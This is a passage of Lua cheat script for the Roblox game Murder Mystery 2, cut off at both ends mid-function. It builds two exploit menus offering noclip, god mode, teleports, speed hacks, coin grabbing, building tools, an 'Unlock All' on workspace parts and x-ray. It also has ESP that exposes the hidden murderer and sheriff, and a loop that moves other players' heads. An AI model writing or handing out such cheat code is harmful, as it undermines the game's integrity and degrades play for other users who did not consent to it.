for i, v in pairs(script.Parent:children()) do
if v.Name ~= "OPEN" then
v.Visible = true
v.Active = true

else
v.Active = false
v.Visible = false
end
end
end)





end
coroutine.wrap(XVGFY_fake_script)()
end)






Section:NewButton("MM2 GUI 6(New)", "This is new", function()

local SlaughterHouse = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Noclip = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local ClickTp = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")
local HeadTp = Instance.new("TextButton")
local TextLabel_3 = Instance.new("TextLabel")
local Sprint = Instance.new("TextButton")
local TextLabel_4 = Instance.new("TextLabel")
local GrabCoins = Instance.new("TextButton")
local God = Instance.new("TextButton")
local TeleportLobby = Instance.new("TextButton")
local GMS = Instance.new("TextButton")
local WS = Instance.new("TextButton")
local BTD = Instance.new("TextButton")
local BTG = Instance.new("TextButton")
local BTC = Instance.new("TextButton")
local BT = Instance.new("TextButton")
local LOCK = Instance.new("TextButton")
local Value = Instance.new("TextBox")
local Open = Instance.new("TextButton")
 
-- Properties
 
SlaughterHouse.Name = "SlaughterHouse"
SlaughterHouse.Parent = game.Players.LocalPlayer.PlayerGui
SlaughterHouse.Enabled = true
SlaughterHouse.ResetOnSpawn = false
 
MainFrame.Name = "MainFrame"
MainFrame.Parent = SlaughterHouse
MainFrame.BackgroundColor3 = Color3.new(0.580392, 0, 0)
MainFrame.BorderColor3 = Color3.new(0.223529, 0.34902, 0.439216)
MainFrame.BorderSizePixel = 4
MainFrame.Position = UDim2.new(0, 800, 0, 200)
MainFrame.Size = UDim2.new(0, 500, 0, 300)
 
Noclip.Name = "Noclip"
Noclip.Parent = MainFrame
Noclip.BackgroundColor3 = Color3.new(0.639216, 0, 0)
Noclip.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
Noclip.BorderSizePixel = 5
Noclip.Position = UDim2.new(0, 350, 0, 75)
Noclip.Size = UDim2.new(0, 25, 0, 25)
Noclip.Font = Enum.Font.SourceSans
Noclip.Text = ""
Noclip.TextColor3 = Color3.new(1, 1, 1)
Noclip.TextSize = 14
 
TextLabel.Parent = Noclip
TextLabel.BackgroundColor3 = Color3.new(0.666667, 0, 0)
TextLabel.BorderSizePixel = 2
TextLabel.Position = UDim2.new(0, 35, 0, 0)
TextLabel.Size = UDim2.new(0, 75, 0, 25)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "Noclip [F]"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextScaled = true
TextLabel.TextSize = 50
TextLabel.TextWrapped = true
 
ClickTp.Name = "ClickTp"
ClickTp.Parent = MainFrame
ClickTp.BackgroundColor3 = Color3.new(0.639216, 0, 0)
ClickTp.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
ClickTp.BorderSizePixel = 5
ClickTp.Position = UDim2.new(0, 350, 0, 125)
ClickTp.Size = UDim2.new(0, 25, 0, 25)
ClickTp.Font = Enum.Font.SourceSans
ClickTp.Text = ""
ClickTp.TextColor3 = Color3.new(1, 1, 1)
ClickTp.TextSize = 14
 
TextLabel_2.Parent = ClickTp
TextLabel_2.BackgroundColor3 = Color3.new(0.666667, 0, 0)
TextLabel_2.BorderSizePixel = 2
TextLabel_2.Position = UDim2.new(0, 35, 0, 0)
TextLabel_2.Size = UDim2.new(0, 75, 0, 25)
TextLabel_2.Font = Enum.Font.SourceSansBold
TextLabel_2.Text = "ClickTp [R]"
TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 50
TextLabel_2.TextWrapped = true
 
HeadTp.Name = "HeadTp"
HeadTp.Parent = MainFrame
HeadTp.BackgroundColor3 = Color3.new(0.639216, 0, 0)
HeadTp.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
HeadTp.BorderSizePixel = 5
HeadTp.Position = UDim2.new(0, 350, 0, 25)
HeadTp.Size = UDim2.new(0, 25, 0, 25)
HeadTp.Font = Enum.Font.SourceSans
HeadTp.Text = ""
HeadTp.TextColor3 = Color3.new(1, 1, 1)
HeadTp.TextSize = 14
 
TextLabel_3.Parent = HeadTp
TextLabel_3.BackgroundColor3 = Color3.new(0.666667, 0, 0)
TextLabel_3.BorderSizePixel = 2
TextLabel_3.Position = UDim2.new(0, 35, 0, 0)
TextLabel_3.Size = UDim2.new(0, 100, 0, 25)
TextLabel_3.Font = Enum.Font.SourceSansBold
TextLabel_3.Text = "Head Tp [Tab]"
TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 50
TextLabel_3.TextWrapped = true
 
Sprint.Name = "Sprint"
Sprint.Parent = MainFrame
Sprint.BackgroundColor3 = Color3.new(0.639216, 0, 0)
Sprint.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
Sprint.BorderSizePixel = 5
Sprint.Position = UDim2.new(0, 350, 0, 175)
Sprint.Size = UDim2.new(0, 25, 0, 25)
Sprint.Font = Enum.Font.SourceSans
Sprint.Text = ""
Sprint.TextColor3 = Color3.new(1, 1, 1)
Sprint.TextSize = 14
 
TextLabel_4.Parent = Sprint
TextLabel_4.BackgroundColor3 = Color3.new(0.666667, 0, 0)
TextLabel_4.BorderSizePixel = 2
TextLabel_4.Position = UDim2.new(0, 35, 0, 0)
TextLabel_4.Size = UDim2.new(0, 100, 0, 25)
TextLabel_4.Font = Enum.Font.SourceSansBold
TextLabel_4.Text = "Sprint[SHIFT]"
TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 50
TextLabel_4.TextWrapped = true
 
GrabCoins.Name = "GrabCoins"
GrabCoins.Parent = MainFrame
GrabCoins.BackgroundColor3 = Color3.new(0.639216, 0, 0)
GrabCoins.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
GrabCoins.BorderSizePixel = 4
GrabCoins.Position = UDim2.new(0, 10, 0, 20)
GrabCoins.Size = UDim2.new(0, 150, 0, 35)
GrabCoins.Font = Enum.Font.SourceSans
GrabCoins.Text = "Grab Coins"
GrabCoins.TextColor3 = Color3.new(1, 1, 1)
GrabCoins.TextScaled = true
GrabCoins.TextSize = 14
GrabCoins.TextWrapped = true
 
God.Name = "God"
God.Parent = MainFrame
God.BackgroundColor3 = Color3.new(0.639216, 0, 0)
God.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
God.BorderSizePixel = 4
God.Position = UDim2.new(0, 10, 0, 70)
God.Size = UDim2.new(0, 150, 0, 35)
God.Font = Enum.Font.SourceSans
God.Text = "God Mode"
God.TextColor3 = Color3.new(1, 1, 1)
God.TextScaled = true
God.TextSize = 14
God.TextWrapped = true
 
TeleportLobby.Name = "TeleportLobby"
TeleportLobby.Parent = MainFrame
TeleportLobby.BackgroundColor3 = Color3.new(0.639216, 0, 0)
TeleportLobby.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
TeleportLobby.BorderSizePixel = 4
TeleportLobby.Position = UDim2.new(0, 10, 0, 120)
TeleportLobby.Size = UDim2.new(0, 150, 0, 35)
TeleportLobby.Font = Enum.Font.SourceSans
TeleportLobby.Text = "Tp To Lobby"
TeleportLobby.TextColor3 = Color3.new(1, 1, 1)
TeleportLobby.TextScaled = true
TeleportLobby.TextSize = 14
TeleportLobby.TextWrapped = true
 
GMS.Name = "GMS"
GMS.Parent = MainFrame
GMS.BackgroundColor3 = Color3.new(0.639216, 0, 0)
GMS.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
GMS.BorderSizePixel = 4
GMS.Position = UDim2.new(0, 10, 0, 170)
GMS.Size = UDim2.new(0, 150, 0, 35)
GMS.Font = Enum.Font.SourceSans
GMS.Text = "Get Murderer And Sheriff"
GMS.TextColor3 = Color3.new(1, 1, 1)
GMS.TextScaled = true
GMS.TextSize = 14
GMS.TextWrapped = true
 
WS.Name = "WS"
WS.Parent = MainFrame
WS.BackgroundColor3 = Color3.new(0.639216, 0, 0)
WS.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
WS.BorderSizePixel = 4
WS.Position = UDim2.new(0, 10, 0, 220)
WS.Size = UDim2.new(0, 150, 0, 35)
WS.Font = Enum.Font.SourceSans
WS.Text = "Walkspeed"
WS.TextColor3 = Color3.new(1, 1, 1)
WS.TextScaled = true
WS.TextSize = 14
WS.TextWrapped = true
 
BTD.Name = "BTD"
BTD.Parent = MainFrame
BTD.BackgroundColor3 = Color3.new(0.639216, 0, 0)
BTD.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
BTD.BorderSizePixel = 4
BTD.Position = UDim2.new(0, 180, 0, 170)
BTD.Size = UDim2.new(0, 150, 0, 35)
BTD.Font = Enum.Font.SourceSans
BTD.Text = "Delete Tool"
BTD.TextColor3 = Color3.new(1, 1, 1)
BTD.TextScaled = true
BTD.TextSize = 14
BTD.TextWrapped = true
 
BTG.Name = "BTG"
BTG.Parent = MainFrame
BTG.BackgroundColor3 = Color3.new(0.639216, 0, 0)
BTG.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
BTG.BorderSizePixel = 4
BTG.Position = UDim2.new(0, 180, 0, 20)
BTG.Size = UDim2.new(0, 150, 0, 35)
BTG.Font = Enum.Font.SourceSans
BTG.Text = "Grab Tool"
BTG.TextColor3 = Color3.new(1, 1, 1)
BTG.TextScaled = true
BTG.TextSize = 14
BTG.TextWrapped = true
 
BTC.Name = "BTC"
BTC.Parent = MainFrame
BTC.BackgroundColor3 = Color3.new(0.639216, 0, 0)
BTC.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
BTC.BorderSizePixel = 4
BTC.Position = UDim2.new(0, 180, 0, 70)
BTC.Size = UDim2.new(0, 150, 0, 35)
BTC.Font = Enum.Font.SourceSans
BTC.Text = "Clone Tool"
BTC.TextColor3 = Color3.new(1, 1, 1)
BTC.TextScaled = true
BTC.TextSize = 14
BTC.TextWrapped = true
 
BT.Name = "BT"
BT.Parent = MainFrame
BT.BackgroundColor3 = Color3.new(0.639216, 0, 0)
BT.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
BT.BorderSizePixel = 4
BT.Position = UDim2.new(0, 180, 0, 120)
BT.Size = UDim2.new(0, 150, 0, 35)
BT.Font = Enum.Font.SourceSans
BT.Text = "Btools"
BT.TextColor3 = Color3.new(1, 1, 1)
BT.TextScaled = true
BT.TextSize = 14
BT.TextWrapped = true
 
LOCK.Name = "LOCK"
LOCK.Parent = MainFrame
LOCK.BackgroundColor3 = Color3.new(0.639216, 0, 0)
LOCK.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
LOCK.BorderSizePixel = 4
LOCK.Position = UDim2.new(0, 180, 0, 220)
LOCK.Size = UDim2.new(0, 150, 0, 35)
LOCK.Font = Enum.Font.SourceSans
LOCK.Text = "Unlock All"
LOCK.TextColor3 = Color3.new(1, 1, 1)
LOCK.TextScaled = true
LOCK.TextSize = 14
LOCK.TextWrapped = true
 
Value.Name = "Value"
Value.Parent = MainFrame
Value.BackgroundColor3 = Color3.new(0.639216, 0, 0)
Value.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
Value.BorderSizePixel = 4
Value.Position = UDim2.new(0, 340, 0, 220)
Value.Size = UDim2.new(0, 150, 0, 35)
Value.Font = Enum.Font.SourceSans
Value.Text = "Value"
Value.TextColor3 = Color3.new(1, 1, 1)
Value.TextScaled = true
Value.TextSize = 14
Value.TextWrapped = true
 
Open.Name = "Open"
Open.Parent = SlaughterHouse
Open.BackgroundColor3 = Color3.new(1, 1, 1)
Open.BorderSizePixel = 4
Open.Position = UDim2.new(0, 0, 0, 500)
Open.Size = UDim2.new(0, 100, 0, 25)
Open.Visible = false
Open.Font = Enum.Font.SourceSans
Open.Text = "Open"
Open.TextScaled = true
Open.TextSize = 14
Open.TextWrapped = true
 
 
 
Player = game.Players.LocalPlayer
Mouse = Player:GetMouse()
UserInputService = game:GetService('UserInputService')
noclip = false
ctp = false
headTp = false
sprint = false
 
 
Noclip.MouseButton1Down:connect(function()
    print("hi")
    if noclip == false then
        noclip = true
        Noclip.BackgroundColor3 = Color3.new(0, 0, 0)
    else
        noclip = false
        Noclip.BackgroundColor3 = MainFrame.BackgroundColor3
 
    end
end)
 
   
ClickTp.MouseButton1Click:connect(function()
    if ctp == false then
        ctp = true
        ClickTp.BackgroundColor3 = Color3.new(0, 0, 0)
    else
        ctp = false
    ClickTp.BackgroundColor3 = MainFrame.BackgroundColor3
    end
end)
 
HeadTp.MouseButton1Click:connect(function()
    if headTp == false then
        headTp = true
        script.Parent.HeadTp.BackgroundColor3 = Color3.new(0, 0, 0)
    else
        headTp = false
    script.Parent.HeadTp.BackgroundColor3 = MainFrame.BackgroundColor3
    end
end)
 
 
 
BTD.MouseButton1Click:connect(function()
local tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
tool.BinType = "Hammer"
end)
 
 
BTC.MouseButton1Click:connect(function()
local tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
tool.BinType = "Clone"
end)
 
 
BTG.MouseButton1Click:connect(function()
local tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
tool.BinType = "GameTool"
end)
 
 
BT.MouseButton1Click:connect(function()
local tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
tool.BinType = "Hammer"
local tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
tool.BinType = "Clone"
 
local tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
tool.BinType = "GameTool"
end)
 
WS.MouseButton1Click:connect(function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = tonumber(script.Parent.Value.Text)
end)
 
 
LOCK.MouseButton1Click:connect(function()
function unlockParts(root)
for _,v in pairs(root:GetChildren()) do
if v:IsA("Part") then
v.Locked = false
end
unlockParts(v)
end
end
unlockParts(game.Workspace)
end)
 
TeleportLobby.MouseButton1Click:connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-109.56, 150, -11.75))
end)
   
GrabCoins.MouseButton1Down:connect(function()
for i,v in pairs(game.Workspace:GetChildren()) do
local f = v:FindFirstChild("CoinContainer")
local q = game.Players.LocalPlayer.Character:FindFirstChild("Torso")
if q and f then
for i,c in pairs(f:GetChildren()) do
c.CFrame = game.Players.LocalPlayer.Character.Torso.CFrame
end
end
end
end)
   
God.MouseButton1Down:connect(function()
        game.Players.LocalPlayer.Character.Humanoid.Name = 1
local l = game.Players.LocalPlayer.Character["1"]:Clone()
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait(0.1)
game.Players.LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game.Players.LocalPlayer.Character.Animate.Disabled = false
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
end)
 
GMS.MouseButton1Down:connect(function()
    local Players = game.Players:GetChildren()
for i,v in pairs(Players) do
 
if v:FindFirstChild("Backpack") or v:FindFirstChild("Character")then
   
if v.Backpack:FindFirstChild("Knife") or v.Character:FindFirstChild("Knife") then
   
   
local BBG = Instance.new("BillboardGui")
--[[BBG.Adornee = BBG.Parent
BBG.Size = UDim2.new(0, 25, 0, 25)
BBG.AlwaysOnTop = true
local BBGF = Instance.new("Frame", BBG)
BBGF.Size = UDim2.new(0, 25, 0, 25)
BBGF.BackgroundColor3 = Color3.new(255, 0, 0)]]
 
        BBG.Parent = v.Character.Head
        BBG.Adornee = v.Character.Head
        BBG.Size = UDim2.new(2, 0, 1, 0)
        BBG.StudsOffset = Vector3.new(-2.5, 6, 0)
        local text = Instance.new("TextLabel", BBG)
        text.Text = "Murderer"
        text.Size = UDim2.new(4, 0, 8, 0)
        text.Position = UDim2.new(0, 0, 0, 0)
        text.TextScaled = true
        text.TextColor3 = Color3.new(255, 0, 0)
        text.BackgroundTransparency = 1
 
 
end
 
end
end
 
 
for i,v in pairs(Players) do
 
if v:FindFirstChild("Backpack") or v:FindFirstChild("Character")then
   
if v.Backpack:FindFirstChild("Revolver") or v.Character:FindFirstChild("Revolver") then
   
   
local BBG = Instance.new("BillboardGui")
--[[BBG.Adornee = BBG.Parent
BBG.Size = UDim2.new(0, 25, 0, 25)
BBG.AlwaysOnTop = true
local BBGF = Instance.new("Frame", BBG)
BBGF.Size = UDim2.new(0, 25, 0, 25)
BBGF.BackgroundColor3 = Color3.new(255, 0, 0)]]
 
        BBG.Parent = v.Character.Head
        BBG.Adornee = v.Character.Head
        BBG.Size = UDim2.new(2, 0, 1, 0)
        BBG.StudsOffset = Vector3.new(-2.5, 6, 0)
        local text = Instance.new("TextLabel", BBG)
        text.Text = "Sheriff"
        text.Size = UDim2.new(4, 0, 8, 0)
        text.Position = UDim2.new(0, 0, 0, 0)
        text.TextScaled = true
        text.TextColor3 = Color3.new(0, 0, 255)
        text.BackgroundTransparency = 1
       
 
end
 
end
end
end)
   
           
Sprint.MouseButton1Click:connect(function()
    if sprint == false then
    sprint = true
    Sprint.BackgroundColor3 = Color3.new(0, 0, 0)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
    else
    sprint = false
    Sprint.BackgroundColor3 = MainFrame.BackgroundColor3
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
    end
end)
 
 
wait()
 
game.Players.LocalPlayer.Character.HumanoidRootPart.Touched:connect(function(part)
    if noclip == true then
        part.CanCollide = false
        wait(1)
        part.CanCollide = true
    end
end)
 
game.Players.LocalPlayer.Character.Humanoid.Died:connect(function()
    wait(6)
game.Players.LocalPlayer.Character.HumanoidRootPart.Touched:connect(function(part)
    if Noclip == true then
        part.CanCollide = false
        wait(1)
        part.CanCollide = true
    end
end)
end)
 
 
 
 
------------------Hotkeys---------------------
 
UserInputService.InputBegan:connect(function(Input, Processed)
   
if Input.UserInputType == Enum.UserInputType.Keyboard then
if Input.KeyCode == Enum.KeyCode.F then
if noclip == false then
    noclip = true
    Noclip.BackgroundColor3 = Color3.new(0, 0, 0)
else
    noclip = false
    Noclip.BackgroundColor3 = MainFrame.BackgroundColor3
end
end
if Input.KeyCode == Enum.KeyCode.R then
if ctp == false then
    ctp = true
    ClickTp.BackgroundColor3 = Color3.new(0, 0, 0)
else
    ctp = false
    ClickTp.BackgroundColor3 = MainFrame.BackgroundColor3
end
end
 
 
 
if Input.KeyCode == Enum.KeyCode.Tab then
if headTp == false then
    headTp = true
    HeadTp.BackgroundColor3 = Color3.new(0, 0, 0)
else
    headTp = false
    HeadTp.BackgroundColor3 = MainFrame.BackgroundColor3
end
end
 
if Input.KeyCode == Enum.KeyCode.LeftShift then
if sprint == false then
    sprint = true
    Sprint.BackgroundColor3 = Color3.new(0, 0, 0)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
else
    sprint = false
    Sprint.BackgroundColor3 = MainFrame.BackgroundColor3
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
end
end
 
 
 
end
end)
 
 
 
-------------------------------------------
 
 
 

Mouse.Button1Down:connect(function()
if  ctp == true then
Player.Character:MoveTo(Mouse.Hit.p)
end
end)
 
for i = 1, math.huge, 1 do
wait(0.5)
for i,v in pairs(game.Players:GetChildren())do
    if v.Name ~= game.Players.LocalPlayer.Name and HeadTp == true then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-109.56, 150, -11.75))
v.Character.Head.Position = game.Players.LocalPlayer.Character.Head.Position + Vector3.new(0,-1,2)
end
end
end
end)

Section:NewButton("MM2 GUI 7", "PC noice", function()
if game.PlaceId == 142823291 then --Proofing just because ;)
--Note: Don't reset with godmode on or you will be stuck on a black screen for a reasonable amount of time
--Change to false if you dont like printing to console
local printvar = true
--Change to true if you want to see names instead of murderer, sheriff, and innocents with esp
local espnames = true
--Change keybinds to your liking
local coinkey = "c" --Coin grabber keybind
local MSkey = "m" --Murderer/Sheriff esp keybind
local playerskey = "q" --All players esp keybind
local espoffkey = "b" --Turn esp off keybind
local flykey = "f" --Fly keybind
local noclipkey = "r" --Noclip keybind
local godmodekey = "g" --Godmode keybind
local xrayonkey = "x" --Xray on keybind
local xrayoffkey = "z" --Xray off keybind
local bringgunkey = "t" --Teleport to gun keybind
local hideshowguikey = "p" --Show/Hide gui keybind
--End of easy customization options

--Gui Buttons and Status--
local MM2 = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Coin = Instance.new("TextButton")
local MSEsp = Instance.new("TextButton")
local MSESPActive = Instance.new("TextLabel")
local PlayersEsp = Instance.new("TextButton")
local PlayersEspActive = Instance.new("TextLabel")
local EspOff = Instance.new("TextButton")
local EspOffActive = Instance.new("TextLabel")
local Run = Instance.new("TextButton")
local RunActiveGui = Instance.new("TextLabel")
local Fly = Instance.new("TextButton")
local FlyActive = Instance.new("TextLabel")
local Noclip = Instance.new("TextButton")
local NoclipActive = Instance.new("TextLabel")
local GodMode = Instance.new("TextButton")
local GodModeActive = Instance.new("TextLabel")
local GuiXrayOn = Instance.new("TextButton")
local GuiXrayOnActive = Instance.new("TextLabel")
local GuiXrayOff = Instance.new("TextButton")
local GuiXrayOffActive = Instance.new("TextLabel")
local BringGun = Instance.new("TextButton")
local Keybinds = Instance.new("TextButton")
local KeybindsActive = Instance.new("TextLabel")
local Hide = Instance.new("TextButton")
local Show = Instance.new("TextButton")

--Other Variables
local runActive = false
local teamname = "None"
local murderer = "None"
local sheriff = "None"
local player = game:GetService("Players").LocalPlayer

local esp = false
local plresp
local track = false

local NClip = false
local char = game.Players.LocalPlayer.Character
local obj = game.workspace
local mouse=game.Players.LocalPlayer:GetMouse()
local LP = game:GetService("Players").LocalPlayer
local flyvar = false

local showvar = true
local inputcode = game:GetService("UserInputService")
local godmodevar = false
local keyOff = false
local NClip = false

--Start of Gui--
MM2.Name = "MM2"
MM2.Parent = game.CoreGui
MM2.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = MM2
Main.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Main.BorderColor3 = Color3.new(0, 0.607843, 1)
Main.BorderSizePixel = 5
Main.Draggable = true
Main.Position = UDim2.new(0.574999988, 0, 0.349999994, 0)
Main.Size = UDim2.new(0.2, 0, 0.4, 0)
Main.Visible = true
Main.Active = true

Title.Name = "Title"
Title.Parent = Main
Title.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Title.BorderColor3 = Color3.new(0, 0.607843, 1) 
Title.BorderSizePixel = 5
Title.Draggable = true
Title.Size = UDim2.new(1.005, 0, 0.2, 0)
Title.ZIndex = 3
Title.Font = Enum.Font.SciFi
Title.FontSize = Enum.FontSize.Size24
Title.Text = "Murder Mystery 2"
Title.TextColor3 = Color3.new(0, 0.607843, 1)
Title.TextScaled = true
Title.TextSize = 20
Title.TextStrokeColor3 = Color3.new(0.129412, 0.54902, 1)
Title.TextWrapped = true

--Start of functions for buttons--
function Create(base, team, colors1, colors2, colors3, teamname) --For all esps
	local bb = Instance.new("BillboardGui",player.PlayerGui)
	bb.Adornee = base
	bb.ExtentsOffset = Vector3.new(0,1,0)
	bb.AlwaysOnTop = true
	bb.Size = UDim2.new(0,5,0,5)
	bb.StudsOffset = Vector3.new(0,1,0)
	bb.Name = "tracker"
	local frame = Instance.new("Frame",bb)
	frame.ZIndex = 10
	frame.BackgroundTransparency = 0.3
	frame.Size = UDim2.new(1,0,1,0)
	local txtlbl = Instance.new("TextLabel",bb)
	txtlbl.ZIndex = 10
	txtlbl.Text = teamname
	txtlbl.BackgroundTransparency = 1
	txtlbl.Position = UDim2.new(0,0,0,-35)
	txtlbl.Size = UDim2.new(1,0,10,0)
	txtlbl.Font = "ArialBold"
	txtlbl.FontSize = "Size12"
	txtlbl.TextStrokeTransparency = 0.5
	if team then --For teams, left over from origianl but never removed
		txtlbl.TextColor3 = Color3.new(0,0,255)
		frame.BackgroundColor3 = Color3.new(0,0,255)
	else
		txtlbl.TextColor3 = Color3.new(colors1,colors2,colors3)
		frame.BackgroundColor3 = Color3.new(colors1,colors2,colors3)
	end
end

function findmurderer() --Find who the murderer is
	local colors1 = 255
	local colors2 = 0
	local colors3 = 0
	for i, v in pairs(game:GetService("Players"):GetChildren()) do
		if v ~= game:GetService("Players").LocalPlayer then
			for i,v in pairs(v.Backpack:GetChildren()) do --Checks backpack for knife
				if v.Name == "Knife" then
					if espnames == true then
						local teamname = v.Parent.Parent.Name
						if v.Parent.Parent.Character.Head ~= nil then
							Create(v.Parent.Parent.Character.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from murderer!")
							end
						end
					elseif espnames == false then
						local teamname = "Murderer"
						if v.Parent.Parent.Character.Head ~= nil then
							Create(v.Parent.Parent.Character.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from murderer!")
							end
						end
					end
					murderer = v.Parent.Parent.Name
					if printvar == true then
						print(murderer.." is Murderer")
					end
				end
			end
			for i,v in pairs(v.Character:GetChildren()) do --Checks workspace player for knife (holding it)
				if v.Name == "Knife" then
					if espnames == true then
						local teamname = v.Parent.Name
						if v.Parent.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Parent.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from murderer!")
							end
						end
					elseif espnames == false then
						local teamname = "Murderer"
						if v.Parent.Head ~= nil then
							Create(v.Parent.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from murderer!")
							end
						end
					end
					murderer = v.Parent.Name
					if printvar == true then --Tried to failproof to stop printing nil
						local murderer1 = tostring(v.Parent.Name)
						print(murderer1.." is Murderer")
					end
				end
			end
		end
	end
end
	
function findsheriff() --Find who the sheriff is
	local colors1 = 0
	local colors2 = 0
	local colors3 = 255
	for i, v in pairs(game:GetService("Players"):GetChildren()) do
		if v ~= game:GetService("Players").LocalPlayer then
			for i,v in pairs(v.Backpack:GetChildren()) do
				if v.Name == "Revolver" or v.Name == "Gun" then --Lazy to check if its revolver or gun and checks backpack for gun
					if espnames == true then
						local teamname = v.Parent.Parent.Name
						if v.Parent.Parent.Character.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Parent.Parent.Character.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from sheriff!")
							end
						end
					elseif espnames == false then
						local teamname = "Sheriff"
						if v.Parent.Parent.Character.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Parent.Parent.Character.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from sheriff!")
							end
						end
					end
					sheriff = v.Parent.Parent.Name
					if printvar == true then
						local sheriff1 = tostring(v.Parent.Parent.Name)
						print(sheriff1.." is Sheriff")
					end
				end
			end
			for i,v in pairs(v.Character:GetChildren()) do
				if v.Name == "Revolver" or v.Name == "Gun" then --Lazy to check if its revolver or gun and checks workspace player for gun (holding it)
					if espnames == true then
						local teamname = v.Parent.Name
						if v.Parent.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Parent.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from sheriff!")
							end
						end
					elseif espnames == false then
						local teamname = "Sheriff"
						if v.Parent.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Parent.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from sheriff!")
							end
						end
					end
					sheriff = v.Parent.Name
					if printvar == true then
						local sheriff1 = tostring(v.Parent.Name)
						print(sheriff1.." is Sheriff")
					end
				end
			end
		end
	end
end

function findplayers() --Find all players but local player
	findmurderer() --Finds murderer
	findsheriff() --Finds sheriff
	local colors1 = 0
	local colors2 = 255
	local colors3 = 0
	for i, v in pairs(game:GetService("Players"):GetChildren()) do
		if v ~= game:GetService("Players").LocalPlayer then --If not local player
			if v.Name ~= murderer then --If not murderer
				if v.Name ~= sheriff then --If not sheriff
					if espnames == true then
						local teamname = v.Name
						if v.Character.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Character.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from sheriff!")
							end
						end
					elseif espnames == false then
						local teamname = "Innocents"
						if v.Parent.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Character.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from sheriff!")
							end
						end
					end
				end
			end
		end
	end
end

function Clear() --Clears all the esps
	for _,v in pairs(player.PlayerGui:children()) do
		if v.Name == "tracker" and v:isA("BillboardGui") then
			v:Destroy()
		end
	end
end

function XrayOn(obj) --Enables xray
	for _,v in pairs(obj:GetChildren()) do 
		if (v:IsA("BasePart")) and not v.Parent:FindFirstChild("Humanoid") then
			v.LocalTransparencyModifier = 0.75
		end
	XrayOn(v) 
	end
end 

function XrayOff(obj) --Disables xray
	for _,v in pairs(obj:GetChildren()) do
		if (v:IsA("BasePart")) and not v.Parent:FindFirstChild("Humanoid") then
			v.LocalTransparencyModifier = 0
		end XrayOff(v)
	end
end

function sFLY() --Fly function
	repeat wait() until LP and LP.Character and LP.Character:FindFirstChild('Torso') and LP.Character:FindFirstChild('Humanoid')
	repeat wait() until mouse
	
	local T = LP.Character.Torso
	local CONTROL = {F = 0, B = 0, L = 0, R = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
	local SPEED = 0
	
	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
